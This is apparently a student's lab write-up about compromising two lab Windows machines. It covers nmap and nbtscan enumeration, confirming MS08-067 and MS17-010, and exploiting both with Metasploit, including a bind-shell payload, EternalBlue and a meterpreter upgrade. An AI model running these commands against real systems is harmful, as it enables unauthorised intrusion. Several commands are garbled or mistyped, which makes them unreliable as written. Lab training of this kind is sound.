I utilized nmap scan to find open ports. Once I found open ports, I then ran a scan for services using sudo nmap –sV 192.168.177.13 192.168.177.25This lead to then enumerating the machine with nbtscan –v –s : 192.168.177.0/24 which displayed the machines with the windows 7 vulnerability we were looking to exploit.We were given the objective if a machine is less than windows 7, we test for vulnerability Microsoft Windows Bulletin MS08-067 the machine with this was Easy- 192.168.177.13If the target is windows 7 or newer then you use Microsoft Windows Bulletin MS17-010 which the machine that matched this was CEH-WIN7
Then we entered the directory of nmap to search scripts cd/usr/nmap/scripts to run related to known vulns ls *vuln*Which then populates anything related to the word vulnusing nmap --script smb-vuln-ms08-067.nse 192.168.177.13 we were able to prove the machine was vulnerableWe repeated the same for 192.168.177.25 to prove it was vulnerable with nmap --script smb-vuln-ms17-010.nse 192.168.177.25
We then moved on to use Metasploit to gain access to the machines 
Using sudo service postgresql start we are able to use this command to speed up our searches
Sudo msfconsole summons Metasploit gui where we can start our process to exploit the machines
We started with search ms08-067 and were able to see a exploit with a great rating to use
We then executed use exploit/windows/smb/ms08_067_netapi 
Once entering the exploit we use the command info to learn about it
Now we can attempt to execute the exploit
We set It up with set RHOSTS 192.168.177.13
We then adjust the payload with show payloads
We need to change it since older targets would crash and burn if we used a payload that was rated anything but easy
Set the payload to set PAYLOAD windows/shell/bind_tcp
We hit enter then type the command exploit to execute it
If the exploit is successful you gain a C:/WINDOWS/system32 cli
We repeat the process for the other machine 192.168.177.25
Sudo msfconsole
Search ms17-010
Use exploit/windows/smb/ms_017_010eternalblueinfoset RHOSTS 192.168.177.25
Set SESSION 1 we do this for bringing in meterpreter later
Background the session we are the going to improve our shell
Search post brings us to the post exploitation modules to improve our shell
Post/multi/manage/shell_to_meterpreter
Y to accept change 
Info for more information
Set SESSION 1 will set your session to 192.168.177.25 like we did before
We then put run
This will open a second shell 
Session –L will populate the sessions we have
Sessions –I 1 elevates the shell to meterpreter (Set the number to the session you want associated)
The command ? Will show you everything you can do now
